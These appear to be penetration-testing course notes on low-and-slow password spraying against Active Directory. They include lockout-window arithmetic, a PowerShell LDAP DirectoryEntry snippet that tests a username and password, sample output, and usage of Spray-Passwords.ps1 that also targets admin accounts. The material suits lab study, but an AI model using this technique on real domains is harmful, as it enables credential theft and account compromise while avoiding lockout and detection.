AD can provide us info that may lead to more advanced PW guessing techs against user accounts. 

Be aware of account lockouts using brute-force and wordlist auth attacks. Too many failed logins will blck account and possibly alert system admins. 

We will use LDAP and ADSI to perform *low and slow* pw attacks against AD users WITHOUT triggering account lockouts. 

Let's look at domain's account policy:
`net account`

There is a lot of great info here. The *Lockout Threshold* indicates a limit of 5 login attempts, this means we can attempt 4 before lockout. This doesn't seem like much.. but look at *Lockout Observation Window*, which indicates that after 30 minutes from the last failed login, we can make another attempt. 

Quick math:
- We can attempt 192 logins in a 24 horu period against every domain user without triggering a lockout, assuming actual users don't fail a login attempt. 

An attack like this would allow us to compile a short list of very commonly used PWs and use it against a massive amount of users. 

### Implementation
There are a number of ways to test and AD user login, but we can use PW to demonstrate. 

We previously performed queries against the DC controlled as the logged-in user. We can also make queries in the context of a diff user by setting the **DirectoryEntry** instance. 

We can provide three arguments including the LDAP path to the DC as well as the uname and PW.

Last entry in our PS script:
```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"

$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "jeff_admin",
"Qwerty09!")
```

If the PW for teh user is correct, the object creation will be succesfful and we will be authenticated with DirectoryEntry:
```
distinguishedName : {DC=corp,DC=com}
Path : LDAP://DC01.corp.com/DC=corp,DC=com
```

If PW is invalied, no object is created and we will get an exception and a clear warning:
```
format-default : The following exception occurred while retrieving member
"distinguishedName": "The user name or password is incorrect.
"
+ CategoryInfo : NotSpecified: (:) [format-default], ExtendedTypeSystemExce
+ FullyQualifiedErrorId : CatchFromBaseGetMember,Microsoft.PowerShell.Commands.Forma
```

Thus, we can create a PS script that enumerates all users and perfoms auths according to the Lockout Threshold and Lockout Observation Window.

An existing implementation of this attack is called **Spray-Passwords.ps1**, located in the **C:\Tools\active_directory** folder for the Win10 client:

PS C:\Tools\active_directory>
` .\Spray-Passwords.ps1 -Pass Qwerty09! -Admin`
**-Pass** Set a single PW or submit a wordlist with **-File**
**-Admin** Also test admin accounts

We will usually need a wordlist with good PW candidates.

We now have ways for obtaining creds for both User and Service accounts. We can start leveraging this to compromise additional machines in the domain, ideally those with high-value logged-in users.